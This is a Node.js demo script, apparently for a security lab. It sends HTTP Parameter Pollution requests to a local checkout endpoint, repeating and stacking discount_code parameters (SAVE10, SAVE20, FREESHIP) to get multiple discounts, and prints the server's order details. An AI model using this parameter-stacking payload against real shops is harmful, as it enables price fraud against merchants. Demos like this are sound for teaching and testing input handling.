
const http = require('http');
const fs = require('fs');

console.log('HPP Attack Demo - Multiple Discount Codes\n');

const HOST = 'localhost';
const PORT = 3000;
const PATH = '/checkout/process';

// Load products from JSON file
const products = JSON.parse(fs.readFileSync('products.json', 'utf8'));

function normalRequest() {
    console.log('\nNormal Request (Single Discount)');
    
    const laptop = products.find(p => p.name === 'Laptop');
    const postData = `product_id=${laptop.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&shipping_method=standard`;

    

    sendRequest(postData, 'normal');
}

function duplicateDiscounts() {
    console.log('\nMultiple Discount Codes');
    
    const smartphone = products.find(p => p.name === 'Smartphone');
    // multiple discount_code parameters
    const postData = `product_id=${smartphone.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&discount_code=SAVE10&discount_code=SAVE10&shipping_method=standard`;

    sendRequest(postData, 'hpp-simple');
}

// Demo 3: Advanced HPP Attack with array-like parameters
function multipleDuplicate() {
    console.log('\nDEMO 3: Advanced HPP Attack - Array Parameters');
    
    const headphones = products.find(p => p.name === 'Headphones');
    const postData = `product_id=${headphones.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&discount_code=SAVE20&discount_code=FREESHIP&shipping_method=overnight`;

    sendRequest(postData, 'hpp-advanced');
}

function sendRequest(postData, demoType) {
    const options = {
        hostname: HOST,
        port: PORT,
        path: PATH,
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'User-Agent': 'HPP-Attack-Demo/1.0'
        }
    };

    console.log(`Sending ${demoType} request...`);
    console.log(`Request data: ${postData}`);
    console.log('Waiting for response...\n');

    const req = http.request(options, (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('end', () => {
            try {
                const response = JSON.parse(data);
                
                console.log('Response Received:');
                console.log(`   Status: ${response.status}`);
                console.log(`   Message: ${response.message}`);
                
                if (response.order_details) {
                    const od = response.order_details;
                    console.log('\nOrder Details:');
                    console.log(`   Product: ${od.product_name}`);
                    console.log(`   Engraving Colors: ${od.engraving_colors}`);
                    console.log(`   Base Price: $${od.base_price}`);
                    console.log(`   Quantity: ${od.quantity}`);
                    console.log(`   Discounts Applied: ${od.discount_codes.join(', ') || 'None'}`);
                    console.log(`   Shipping: ${od.shipping_method} ($${od.shipping_cost})`);
                    console.log(`   Final Total: $${od.final_total}`);
                    
                    if (od.discount_history && od.discount_history.length > 0) {
                        console.log('\   Discount History:');
                        od.discount_history.forEach(history => {
                            console.log(`     - ${history}`);
                        });
                    }
                }
                
                if (response.debug_info) {
                    const di = response.debug_info;
                    console.log('\nDebug Info (What Server Actually Received):');
                    console.log(`   Product IDs: ${JSON.stringify(di.all_product_ids)}`);
                    console.log(`   Engraving Colors: ${JSON.stringify(di.all_engraving_colors)}`);
                    console.log(`   Quantities: ${JSON.stringify(di.all_quantities)}`);
                    console.log(`   Discounts: ${JSON.stringify(di.all_discounts)}`);
                    console.log(`   Shipping Methods: ${JSON.stringify(di.all_shipping_methods)}`);
                }
                
            } catch (e) {
                console.log('Error parsing response:', e.message);
                console.log('Raw response:', data);
            }
            
            console.log('\n' + '='.repeat(60));
        });
    });

    req.on('error', (e) => {
        console.log(`Request error: ${e.message}`);
    });

    req.write(postData);
    req.end();
}

setTimeout(() => {

    normalRequest();

}, 1000);

setTimeout(() => {

    duplicateDiscounts();

}, 4000);

setTimeout(() => {

    multipleDuplicate();

}, 7000);
